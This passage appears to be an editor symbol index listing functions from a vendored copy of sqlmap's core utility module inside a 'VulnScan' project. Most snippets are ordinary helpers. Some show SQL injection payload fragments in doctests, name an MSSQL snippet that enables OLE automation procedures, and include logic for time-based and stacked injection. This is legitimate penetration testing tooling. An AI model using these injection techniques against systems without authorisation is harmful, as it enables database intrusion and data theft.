        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getSQLSnippet(dbms, sfile, **variables):\n    \"\"\"\n    Returns content of SQL snippet located inside 'procs/' directory\n    >>> 'RECONFIGURE' in getSQLSnippet(DBMS.MSSQL, \"activate_sp_oacreate\")\n    True\n    \"\"\"\n    if sfile.endswith('.sql') and os.path.exists(sfile):\n        filename = sfile\n    elif not sfile.endswith('.sql') and os.path.exists(\"%s.sql\" % sfile):\n        filename = \"%s.sql\" % sfile",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "readCachedFileContent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def readCachedFileContent(filename, mode=\"rb\"):\n    \"\"\"\n    Cached reading of file content (avoiding multiple same file reading)\n    >>> \"readCachedFileContent\" in readCachedFileContent(__file__)\n    True\n    \"\"\"\n    if filename not in kb.cache.content:\n        with kb.locks.cache:\n            if filename not in kb.cache.content:\n                checkFile(filename)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "average",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def average(values):\n    \"\"\"\n    Computes the arithmetic mean of a list of numbers.\n    >>> \"%.1f\" % average([0.9, 0.9, 0.9, 1.0, 0.8, 0.9])\n    '0.9'\n    \"\"\"\n    return (1.0 * sum(values) / len(values)) if values else None\n@cachedmethod\ndef stdev(values):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "stdev",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def stdev(values):\n    \"\"\"\n    Computes standard deviation of a list of numbers.\n    # Reference: http://www.goldb.org/corestats.html\n    >>> \"%.3f\" % stdev([0.9, 0.9, 0.9, 1.0, 0.8, 0.9])\n    '0.063'\n    \"\"\"\n    if not values or len(values) < 2:\n        return None\n    else:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def calculateDeltaSeconds(start):\n    \"\"\"\n    Returns elapsed time from start till now\n    >>> calculateDeltaSeconds(0) > 1151721660\n    True\n    \"\"\"\n    return time.time() - start\ndef initCommonOutputs():\n    \"\"\"\n    Initializes dictionary containing common output values used by \"good samaritan\" feature",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "initCommonOutputs",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def initCommonOutputs():\n    \"\"\"\n    Initializes dictionary containing common output values used by \"good samaritan\" feature\n    >>> initCommonOutputs(); \"information_schema\" in kb.commonOutputs[\"Databases\"]\n    True\n    \"\"\"\n    kb.commonOutputs = {}\n    key = None\n    for line in openFile(paths.COMMON_OUTPUTS, 'r'):\n        if line.find('#') != -1:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFileItems",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getFileItems(filename, commentPrefix='#', unicoded=True, lowercase=False, unique=False):\n    \"\"\"\n    Returns newline delimited items contained inside file\n    >>> \"SELECT\" in getFileItems(paths.SQL_KEYWORDS)\n    True\n    \"\"\"\n    retVal = list() if not unique else OrderedDict()\n    if filename:\n        filename = filename.strip('\"\\'')\n    checkFile(filename)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "goGoodSamaritan",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def goGoodSamaritan(prevValue, originalCharset):\n    \"\"\"\n    Function for retrieving parameters needed for common prediction (good\n    samaritan) feature.\n    prevValue: retrieved query output so far (e.g. 'i').\n    Returns commonValue if there is a complete single match (in kb.partRun\n    of txt/common-outputs.txt under kb.partRun) regarding parameter\n    prevValue. If there is no single value match, but multiple, commonCharset is\n    returned containing more probable characters (retrieved from matched\n    values in txt/common-outputs.txt) together with the rest of charset as",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPartRun",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getPartRun(alias=True):\n    \"\"\"\n    Goes through call stack and finds constructs matching\n    conf.dbmsHandler.*. Returns it or its alias used in 'txt/common-outputs.txt'\n    \"\"\"\n    retVal = None\n    commonPartsDict = optDict[\"Enumeration\"]\n    try:\n        stack = [item[4][0] if isinstance(item[4], list) else '' for item in inspect.stack()]\n        # Goes backwards through the stack to find the conf.dbmsHandler method",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "longestCommonPrefix",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def longestCommonPrefix(*sequences):\n    \"\"\"\n    Returns longest common prefix occuring in given sequences\n    # Reference: http://boredzo.org/blog/archives/2007-01-06/longest-common-prefix-in-python-2\n    >>> longestCommonPrefix('foobar', 'fobar')\n    'fo'\n    \"\"\"\n    if len(sequences) == 1:\n        return sequences[0]\n    sequences = [pair[1] for pair in sorted((len(fi), fi) for fi in sequences)]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "commonFinderOnly",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def commonFinderOnly(initial, sequence):\n    \"\"\"\n    Returns parts of sequence which start with the given initial string\n    >>> commonFinderOnly(\"abcd\", [\"abcdefg\", \"foobar\", \"abcde\"])\n    'abcde'\n    \"\"\"\n    return longestCommonPrefix(*[_ for _ in sequence if _.startswith(initial)])\ndef pushValue(value):\n    \"\"\"\n    Push value to the stack (thread dependent)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def pushValue(value):\n    \"\"\"\n    Push value to the stack (thread dependent)\n    \"\"\"\n    exception = None\n    success = False\n    for i in xrange(PUSH_VALUE_EXCEPTION_RETRY_COUNT):\n        try:\n            getCurrentThreadData().valueStack.append(copy.deepcopy(value))\n            success = True",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def popValue():\n    \"\"\"\n    Pop value from the stack (thread dependent)\n    >>> pushValue('foobar')\n    >>> popValue()\n    'foobar'\n    \"\"\"\n    retVal = None\n    try:\n        retVal = getCurrentThreadData().valueStack.pop()",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDBMSError",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def wasLastResponseDBMSError():\n    \"\"\"\n    Returns True if the last web request resulted in a (recognized) DBMS error page\n    \"\"\"\n    threadData = getCurrentThreadData()\n    return threadData.lastErrorPage and threadData.lastErrorPage[0] == threadData.lastRequestUID\ndef wasLastResponseHTTPError():\n    \"\"\"\n    Returns True if the last web request resulted in an erroneous HTTP code (like 500)\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseHTTPError",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def wasLastResponseHTTPError():\n    \"\"\"\n    Returns True if the last web request resulted in an erroneous HTTP code (like 500)\n    \"\"\"\n    threadData = getCurrentThreadData()\n    return threadData.lastHTTPError and threadData.lastHTTPError[0] == threadData.lastRequestUID\ndef wasLastResponseDelayed():\n    \"\"\"\n    Returns True if the last web request resulted in a time-delay\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDelayed",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def wasLastResponseDelayed():\n    \"\"\"\n    Returns True if the last web request resulted in a time-delay\n    \"\"\"\n    # 99.9999999997440% of all non time-based SQL injection affected\n    # response times should be inside +-7*stdev([normal response times])\n    # Math reference: http://www.answers.com/topic/standard-deviation\n    deviation = stdev(kb.responseTimes.get(kb.responseTimeMode, []))\n    threadData = getCurrentThreadData()\n    if deviation and not conf.direct and not conf.disableStats:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "adjustTimeDelay",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def adjustTimeDelay(lastQueryDuration, lowerStdLimit):\n    \"\"\"\n    Provides tip for adjusting time delay in time-based data retrieval\n    \"\"\"\n    candidate = (1 if not isHeavyQueryBased() else 2) + int(round(lowerStdLimit))\n    kb.delayCandidates = [candidate] + kb.delayCandidates[:-1]\n    if all((_ == candidate for _ in kb.delayCandidates)) and candidate < conf.timeSec:\n        if lastQueryDuration / (1.0 * conf.timeSec / candidate) > MIN_VALID_DELAYED_RESPONSE:  # Note: to prevent problems with fast responses for heavy-queries like RANDOMBLOB\n            conf.timeSec = candidate\n            infoMsg = \"adjusting time delay to \"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLastRequestHTTPError",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getLastRequestHTTPError():\n    \"\"\"\n    Returns last HTTP error code\n    \"\"\"\n    threadData = getCurrentThreadData()\n    return threadData.lastHTTPError[1] if threadData.lastHTTPError else None\ndef extractErrorMessage(page):\n    \"\"\"\n    Returns reported error message from page if it founds one\n    >>> getText(extractErrorMessage(u'<html><title>Test</title>\\\\n<b>Warning</b>: oci_parse() [function.oci-parse]: ORA-01756: quoted string not properly terminated<br><p>Only a test page</p></html>') )",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractErrorMessage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def extractErrorMessage(page):\n    \"\"\"\n    Returns reported error message from page if it founds one\n    >>> getText(extractErrorMessage(u'<html><title>Test</title>\\\\n<b>Warning</b>: oci_parse() [function.oci-parse]: ORA-01756: quoted string not properly terminated<br><p>Only a test page</p></html>') )\n    'oci_parse() [function.oci-parse]: ORA-01756: quoted string not properly terminated'\n    >>> extractErrorMessage('Warning: This is only a dummy foobar test') is None\n    True\n    \"\"\"\n    retVal = None\n    if isinstance(page, six.string_types):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "findLocalPort",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def findLocalPort(ports):\n    \"\"\"\n    Find the first opened localhost port from a given list of ports (e.g. for Tor port checks)\n    \"\"\"\n    retVal = None\n    for port in ports:\n        try:\n            try:\n                s = socket._orig_socket(socket.AF_INET, socket.SOCK_STREAM)\n            except AttributeError:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "findMultipartPostBoundary",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def findMultipartPostBoundary(post):\n    \"\"\"\n    Finds value for a boundary parameter in given multipart POST body\n    >>> findMultipartPostBoundary(\"-----------------------------9051914041544843365972754266\\\\nContent-Disposition: form-data; name=text\\\\n\\\\ndefault\")\n    '9051914041544843365972754266'\n    \"\"\"\n    retVal = None\n    done = set()\n    candidates = []\n    for match in re.finditer(r\"(?m)^--(.+?)(--)?$\", post or \"\"):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def urldecode(value, encoding=None, unsafe=\"%%?&=;+%s\" % CUSTOM_INJECTION_MARK_CHAR, convall=False, spaceplus=True):\n    \"\"\"\n    URL decodes given value\n    >>> urldecode('AND%201%3E%282%2B3%29%23', convall=True) == 'AND 1>(2+3)#'\n    True\n    >>> urldecode('AND%201%3E%282%2B3%29%23', convall=False) == 'AND 1>(2%2B3)#'\n    True\n    >>> urldecode(b'AND%201%3E%282%2B3%29%23', convall=False) == 'AND 1>(2%2B3)#'\n    True\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "urlencode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def urlencode(value, safe=\"%&=-_\", convall=False, limit=False, spaceplus=False):\n    \"\"\"\n    URL encodes given value\n    >>> urlencode('AND 1>(2+3)#')\n    'AND%201%3E%282%2B3%29%23'\n    >>> urlencode(\"AND COUNT(SELECT name FROM users WHERE name LIKE '%DBA%')>0\")\n    'AND%20COUNT%28SELECT%20name%20FROM%20users%20WHERE%20name%20LIKE%20%27%25DBA%25%27%29%3E0'\n    >>> urlencode(\"AND COUNT(SELECT name FROM users WHERE name LIKE '%_SYSTEM%')>0\")\n    'AND%20COUNT%28SELECT%20name%20FROM%20users%20WHERE%20name%20LIKE%20%27%25_SYSTEM%25%27%29%3E0'\n    >>> urlencode(\"SELECT NAME FROM TABLE WHERE VALUE LIKE '%SOME%BEGIN%'\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "runningAsAdmin",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def runningAsAdmin():\n    \"\"\"\n    Returns True if the current process is run under admin privileges\n    \"\"\"\n    isAdmin = None\n    if PLATFORM in (\"posix\", \"mac\"):\n        _ = os.geteuid()\n        isAdmin = isinstance(_, (float, six.integer_types)) and _ == 0\n    elif IS_WIN:\n        import ctypes",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "logHTTPTraffic",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def logHTTPTraffic(requestLogMsg, responseLogMsg, startTime=None, endTime=None):\n    \"\"\"\n    Logs HTTP traffic to the output file\n    \"\"\"\n    if conf.harFile:\n        conf.httpCollector.collectRequest(requestLogMsg, responseLogMsg, startTime, endTime)\n    if conf.trafficFile:\n        with kb.locks.log:\n            dataToTrafficFile(\"%s%s\" % (requestLogMsg, os.linesep))\n            dataToTrafficFile(\"%s%s\" % (responseLogMsg, os.linesep))",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPageTemplate",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getPageTemplate(payload, place):  # Cross-referenced function\n    raise NotImplementedError\n@cachedmethod\ndef getPublicTypeMembers(type_, onlyValues=False):\n    \"\"\"\n    Useful for getting members from types (e.g. in enums)\n    >>> [_ for _ in getPublicTypeMembers(OS, True)]\n    ['Linux', 'Windows']\n    >>> [_ for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True)]\n    [1, 2, 3, 4, 5, 6]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getPublicTypeMembers(type_, onlyValues=False):\n    \"\"\"\n    Useful for getting members from types (e.g. in enums)\n    >>> [_ for _ in getPublicTypeMembers(OS, True)]\n    ['Linux', 'Windows']\n    >>> [_ for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True)]\n    [1, 2, 3, 4, 5, 6]\n    \"\"\"\n    retVal = []\n    for name, value in inspect.getmembers(type_):",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "enumValueToNameLookup",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def enumValueToNameLookup(type_, value_):\n    \"\"\"\n    Returns name of a enum member with a given value\n    >>> enumValueToNameLookup(SORT_ORDER, 100)\n    'LAST'\n    \"\"\"\n    retVal = None\n    for name, value in getPublicTypeMembers(type_):\n        if value == value_:\n            retVal = name",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def extractRegexResult(regex, content, flags=0):\n    \"\"\"\n    Returns 'result' group value from a possible match with regex on a given\n    content\n    >>> extractRegexResult(r'a(?P<result>[^g]+)g', 'abcdefg')\n    'bcdef'\n    >>> extractRegexResult(r'a(?P<result>[^g]+)g', 'ABCDEFG', re.I)\n    'BCDEF'\n    \"\"\"\n    retVal = None",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractTextTagContent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def extractTextTagContent(page):\n    \"\"\"\n    Returns list containing content from \"textual\" tags\n    >>> extractTextTagContent('<html><head><title>Title</title></head><body><pre>foobar</pre><a href=\"#link\">Link</a></body></html>')\n    ['Title', 'foobar']\n    \"\"\"\n    page = page or \"\"\n    if REFLECTED_VALUE_MARKER in page:\n        try:\n            page = re.sub(r\"(?i)[^\\s>]*%s[^\\s<]*\" % REFLECTED_VALUE_MARKER, \"\", page)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "trimAlphaNum",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def trimAlphaNum(value):\n    \"\"\"\n    Trims alpha numeric characters from start and ending of a given value\n    >>> trimAlphaNum('AND 1>(2+3)-- foobar')\n    ' 1>(2+3)-- '\n    \"\"\"\n    while value and value[-1].isalnum():\n        value = value[:-1]\n    while value and value[0].isalnum():\n        value = value[1:]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isNumPosStrValue(value):\n    \"\"\"\n    Returns True if value is a string (or integer) with a positive integer representation\n    >>> isNumPosStrValue(1)\n    True\n    >>> isNumPosStrValue('1')\n    True\n    >>> isNumPosStrValue(0)\n    False\n    >>> isNumPosStrValue('-2')",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "aliasToDbmsEnum",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def aliasToDbmsEnum(dbms):\n    \"\"\"\n    Returns major DBMS name from a given alias\n    >>> aliasToDbmsEnum('mssql')\n    'Microsoft SQL Server'\n    \"\"\"\n    retVal = None\n    if dbms:\n        for key, item in DBMS_DICT.items():\n            if dbms.lower() in item[0] or dbms.lower() == key.lower():",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "findDynamicContent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def findDynamicContent(firstPage, secondPage):\n    \"\"\"\n    This function checks if the provided pages have dynamic content. If they\n    are dynamic, proper markings will be made\n    >>> findDynamicContent(\"Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.\", \"Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. <script src='ads.js'></script>Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.\")\n    >>> kb.dynamicMarkings\n    [('natum reque et per. ', 'Facer tritani repreh')]\n    \"\"\"\n    if not firstPage or not secondPage:\n        return",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "removeDynamicContent",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def removeDynamicContent(page):\n    \"\"\"\n    Removing dynamic content from supplied page basing removal on\n    precalculated dynamic markings\n    \"\"\"\n    if page:\n        for item in kb.dynamicMarkings:\n            prefix, suffix = item\n            if prefix is None and suffix is None:\n                continue",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterStringValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def filterStringValue(value, charRegex, replacement=\"\"):\n    \"\"\"\n    Returns string value consisting only of chars satisfying supplied\n    regular expression (note: it has to be in form [...])\n    >>> filterStringValue('wzydeadbeef0123#', r'[0-9a-f]')\n    'deadbeef0123'\n    \"\"\"\n    retVal = value\n    if value:\n        retVal = re.sub(charRegex.replace(\"[\", \"[^\") if \"[^\" not in charRegex else charRegex.replace(\"[^\", \"[\"), replacement, value)",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterControlChars",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def filterControlChars(value, replacement=' '):\n    \"\"\"\n    Returns string value with control chars being supstituted with replacement character\n    >>> filterControlChars('AND 1>(2+3)\\\\n--')\n    'AND 1>(2+3) --'\n    \"\"\"\n    return filterStringValue(value, PRINTABLE_CHAR_REGEX, replacement)\ndef filterNone(values):\n    \"\"\"\n    Emulates filterNone([...]) functionality",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def filterNone(values):\n    \"\"\"\n    Emulates filterNone([...]) functionality\n    >>> filterNone([1, 2, \"\", None, 3])\n    [1, 2, 3]\n    \"\"\"\n    retVal = values\n    if isinstance(values, _collections.Iterable):\n        retVal = [_ for _ in values if _]\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDBMSVersionAtLeast",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isDBMSVersionAtLeast(minimum):\n    \"\"\"\n    Checks if the recognized DBMS version is at least the version specified\n    >>> pushValue(kb.dbmsVersion)\n    >>> kb.dbmsVersion = \"2\"\n    >>> isDBMSVersionAtLeast(\"1.3.4.1.4\")\n    True\n    >>> isDBMSVersionAtLeast(2.1)\n    False\n    >>> isDBMSVersionAtLeast(\">2\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseSqliteTableSchema",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def parseSqliteTableSchema(value):\n    \"\"\"\n    Parses table column names and types from specified SQLite table schema\n    >>> kb.data.cachedColumns = {}\n    >>> parseSqliteTableSchema(\"CREATE TABLE users(\\\\n\\\\t\\\\tid INTEGER,\\\\n\\\\t\\\\tname TEXT\\\\n);\")\n    True\n    >>> tuple(kb.data.cachedColumns[conf.db][conf.tbl].items()) == (('id', 'INTEGER'), ('name', 'TEXT'))\n    True\n    >>> parseSqliteTableSchema(\"CREATE TABLE dummy(`foo bar` BIGINT, \\\\\"foo\\\\\" VARCHAR, 'bar' TEXT)\");\n    True",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechniqueData",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def getTechniqueData(technique=None):\n    \"\"\"\n    Returns injection data for technique specified\n    \"\"\"\n    return kb.injection.data.get(technique if technique is not None else getTechnique())\ndef isTechniqueAvailable(technique):\n    \"\"\"\n    Returns True if there is injection data which sqlmap could use for technique specified\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.ERROR] = [test for test in getSortedInjectionTests() if \"error\" in test[\"title\"].lower()][0]",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isTechniqueAvailable(technique):\n    \"\"\"\n    Returns True if there is injection data which sqlmap could use for technique specified\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.ERROR] = [test for test in getSortedInjectionTests() if \"error\" in test[\"title\"].lower()][0]\n    >>> isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR)\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n    if conf.technique and isinstance(conf.technique, list) and technique not in conf.technique:",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isHeavyQueryBased",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isHeavyQueryBased(technique=None):\n    \"\"\"\n    Returns True whether current (kb.)technique is heavy-query based\n    >>> pushValue(kb.injection.data)\n    >>> setTechnique(PAYLOAD.TECHNIQUE.STACKED)\n    >>> kb.injection.data[getTechnique()] = [test for test in getSortedInjectionTests() if \"heavy\" in test[\"title\"].lower()][0]\n    >>> isHeavyQueryBased()\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
        "peekOfCode": "def isStackingAvailable():\n    \"\"\"\n    Returns True whether techniques using stacking are available\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.STACKED] = [test for test in getSortedInjectionTests() if \"stacked\" in test[\"title\"].lower()][0]\n    >>> isStackingAvailable()\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n    retVal = False",
        "detail": "VulnScan.modules.sqlmap.lib.core.common",
        "documentation": {}
    },
    {
        "label": "isInferenceAvailable",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.common",
        "description": "VulnScan.modules.sqlmap.lib.core.common",
